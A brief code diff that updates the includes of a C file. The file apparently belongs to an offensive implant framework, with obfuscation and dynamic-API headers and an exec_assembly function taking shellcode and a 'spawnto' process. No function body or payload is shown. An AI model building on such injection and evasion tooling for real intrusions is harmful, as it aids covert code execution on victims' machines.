@@ -1,11 +1,11 @@
+#include <winsock2.h>
 #include <windows.h>
 #include <stdint.h>
-#include <string.h>
-#include <stdio.h>
 #include "assembly.h"
 #include "obf.h"
 #include "obf_strings.h"
 #include "../../include/dynapi.h"
+#include "../../include/mini_std.h"
 
 int exec_assembly(const uint8_t *shellcode, uint32_t sc_len,
                   const wchar_t *spawnto,
